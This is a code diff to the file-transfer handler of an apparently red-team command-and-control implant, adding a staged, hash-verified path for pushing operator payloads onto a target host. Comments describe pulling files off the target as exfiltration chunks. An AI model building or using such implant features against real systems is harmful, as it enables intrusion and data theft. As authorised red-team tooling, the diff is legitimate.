@@ -1,3 +1,4 @@
+using System.Security.Cryptography;
 using System.Text;
 using Rod.V1;
 using SysFile = System.IO.File;
@@ -9,15 +10,17 @@ namespace Rod.Implant.Internal;
 // off the target and file.push uploads one onto it -- the two-direction
 // baseline every C2 exposes. Small pulls return inline in the TaskResult
 // output; larger ones stream as ExfilChunk frames into the engagement artifact
-// store. A push rides the task arguments as base64 and lands on disk whole;
-// the size cap keeps one push inside the single-frame budget, so anything
-// larger waits for a staged upload path (the per-verb typed-arm escape hatch,
-// architecture.md Sec 10) rather than failing mid-transfer.
+// store. A small push rides the task arguments as base64 and lands on disk
+// whole; a larger one rides the typed arm (architecture.md Sec 10) -- the
+// payload is staged server-side, its sha256 rides the signed arguments, and
+// the beacon loop demands and reassembles the chunk run before dispatching
+// the staged handler below.
 //
 // Argument shape:
 //
 //   file.pull <path>
-//   file.push <path> <base64>
+//   file.push <path> <base64>              (inline; single-frame budget)
+//   file.push <path> sha256:<hex>          (staged; bytes follow on demand)
 //
 // As with the other reference handlers, this performs no evasion, no
 // obfuscation, and no destructive behavior (RESPONSIBLE-USE.md, architecture.md
@@ -123,6 +126,52 @@ internal static class Files
         if (data.Length > MaxPushBytes)
             return (TaskOutcome.Failed,
                 $"file.push: payload of {data.Length} bytes exceeds the {MaxPushBytes}-byte single-task cap");
+
+        try
+        {
+            var parent = Path.GetDirectoryName(Path.GetFullPath(path));
+            if (!string.IsNullOrEmpty(parent))
+                Directory.CreateDirectory(parent);
+            SysFile.WriteAllBytes(path, data);
+        }
+        catch (Exception ex)
+        {
+            return (TaskOutcome.Failed, "write " + path + ": " + ex.Message);
+        }
+
+        return (TaskOutcome.Succeeded, $"wrote {data.Length} bytes to {path}");
+    }
+
+    /// <summary>
+    /// The staged push path (architecture.md Sec 10, the typed arm): the
+    /// arguments carry the target path and the <c>sha256:</c> token the issuer
+    /// bound into the signed tasking tuple, and <paramref name="data"/> is the
+    /// reassembled chunk run the beacon loop demanded. The hash is verified
+    /// before anything touches disk -- the signature covers the token, so a
+    /// mismatch means the staged stream was altered in flight and the file is
+    /// not written. No size cap applies: the bytes never rode a single frame.
+    /// </summary>
+    public static (TaskOutcome Outcome, string Output) PushStaged(string arguments, byte[] data)
+    {
+        const string Prefix = "sha256:";
+
+        var separator = arguments.LastIndexOf(' ');
+        if (separator < 0)
+            return (TaskOutcome.Failed, "file.push staged expects '<path> sha256:<hex>'");
+        var path = arguments[..separator].Trim();
+        var token = arguments[(separator + 1)..].Trim();
+        if (path.Length == 0
+            || !token.StartsWith(Prefix, StringComparison.OrdinalIgnoreCase)
+            || token.Length != Prefix.Length + 64)
+        {
+            return (TaskOutcome.Failed, "file.push staged expects '<path> sha256:<hex>'");
+        }
+
+        var expected = token[Prefix.Length..].ToLowerInvariant();
+        var actual = Convert.ToHexString(SHA256.HashData(data)).ToLowerInvariant();
+        if (actual != expected)
+            return (TaskOutcome.Failed,
+                $"file.push staged: payload hash mismatch: expected {expected}, received {actual}");
 
         try
         {
